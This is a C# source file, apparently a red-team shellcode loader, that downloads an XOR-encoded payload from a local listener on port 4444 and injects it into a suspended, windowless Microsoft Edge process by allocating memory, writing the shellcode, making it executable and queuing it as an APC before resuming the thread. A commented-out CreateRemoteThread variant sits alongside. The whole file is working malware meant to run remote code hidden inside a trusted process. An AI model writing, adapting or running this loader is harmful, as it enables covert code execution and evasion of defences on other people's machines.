using System;
using System.ComponentModel;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;


namespace TestAssembly
{
        public class Program
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool CreateProcessW(
            string applicationName,
            string commandLine,
        IntPtr processAttributes,
        IntPtr threadAttributes,
            bool inheritHandles,
        CREATION_FLAGS creationFlags,
        IntPtr environment,
            string currentDirectory,
        ref STARTUPINFO startupInfo,
        out PROCESS_INFORMATION processInformation);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [Flags]
        public enum CREATION_FLAGS : uint
        {
            DEBUG_PROCESS = 0x00000001,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            CREATE_SUSPENDED = 0x00000004,
            DETACHED_PROCESS = 0x00000008,
            CREATE_NEW_CONSOLE = 0x00000010,
            NORMAL_PRIORITY_CLASS = 0x00000020,
            IDLE_PRIORITY_CLASS = 0x00000040,
            HIGH_PRIORITY_CLASS = 0x00000080,
            REALTIME_PRIORITY_CLASS = 0x00000100,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            CREATE_SEPARATE_WOW_VDM = 0x00000800,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_FORCEDOS = 0x00002000,
            BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
            ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
            INHERIT_PARENT_AFFINITY = 0x00010000,
            INHERIT_CALLER_PRIORITY = 0x00020000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
            PROCESS_MODE_BACKGROUND_END = 0x00200000,
            CREATE_SECURE_PROCESS = 0x00400000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NO_WINDOW = 0x08000000,
            PROFILE_USER = 0x10000000,
            PROFILE_KERNEL = 0x20000000,
            PROFILE_SERVER = 0x40000000,
            CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public int cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public int dwX;
            public int dwY;
            public int dwXSize;
            public int dwYSize;
            public int dwXCountChars;
            public int dwYCountChars;
            public int dwFillAttribute;
            public int dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
   uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            [Optional] IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
   uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);

        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        [Flags]
        public enum MemoryProtection
        {
            Execute = 0x10,
            ExecuteRead = 0x20,
            ExecuteReadWrite = 0x40,
            ExecuteWriteCopy = 0x80,
            NoAccess = 0x01,
            ReadOnly = 0x02,
            ReadWrite = 0x04,
            WriteCopy = 0x08,
            GuardModifierflag = 0x100,
            NoCacheModifierflag = 0x200,
            WriteCombineModifierflag = 0x400
        }

        [DllImport("kernel32.dll")]
        public static extern bool ResumeThread(IntPtr hObject);

        [DllImport("kernel32.dll")]
        public static extern bool QueueUserAPC(IntPtr lpAddress, IntPtr hThread, IntPtr another);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        static extern int MessageBoxW(IntPtr hWnd, string lpText, string lpCaption, uint uType);

        void displayError()
        {
            var error = new Win32Exception(Marshal.GetLastWin32Error());
            MessageBoxW(IntPtr.Zero, error.Message, "error", 0);
        }

   //     [DllImport("kernel32.dll")]
   //     static extern IntPtr CreateRemoteThread(IntPtr hProcess,
   //IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
   //IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

        public Program()
        {
            byte[] shellcode;

            using (var client = new WebClient())
            {
                // make proxy aware
                client.Proxy = WebRequest.GetSystemWebProxy();
                client.UseDefaultCredentials = true;

                // set allowed tls versions
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12 | SecurityProtocolType.Tls13;

                shellcode = client.DownloadData("http://localhost:4444/shellcode.bin");
            };

            for (int i = 0; i < shellcode.Length; i++)
            {
                shellcode[i] ^= 55;
            }

            var startup = new STARTUPINFO { dwFlags = 0x00000001 };
            startup.cb = Marshal.SizeOf(startup);

            var success = CreateProcessW(
                @"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
                @"""C:\Program Files\(x86)\Microsoft\Edge\Application\msedge.exe --no-startup-window --win-session-start /prefetch:5""",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                CREATION_FLAGS.CREATE_NO_WINDOW | CREATION_FLAGS.CREATE_SUSPENDED,
                //CREATION_FLAGS.CREATE_NO_WINDOW,
                IntPtr.Zero,
                @"C:\Program Files (x86)\Microsoft\Edge\Application",
                ref startup,
                out var processInfo);

            if (!success)
            {
                displayError();
            }

            var baseAddress = VirtualAllocEx(
                processInfo.hProcess,
                IntPtr.Zero,
                (uint)shellcode.Length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ReadWrite);

            success = WriteProcessMemory(
                processInfo.hProcess,
                baseAddress,
                shellcode,
                (uint)shellcode.Length,
                IntPtr.Zero);

            if (!success)
            {
                displayError();
            }

            success = VirtualProtectEx(
                processInfo.hProcess,
                baseAddress,
                (uint)shellcode.Length,
                MemoryProtection.ExecuteRead,
                out _);

            _ = QueueUserAPC(
                baseAddress,
                processInfo.hThread,
                IntPtr.Zero);

            ResumeThread(processInfo.hThread);

            //uint threadId = 0;
            //var hThread = CreateRemoteThread(
            //    processInfo.hProcess,
            //    IntPtr.Zero,
            //    0,
            //    baseAddress,
            //    IntPtr.Zero,
            //    0,
            //    out threadId);

            //CloseHandle(hThread);


            CloseHandle(processInfo.hThread);
            CloseHandle(processInfo.hProcess);
        }
    }
}
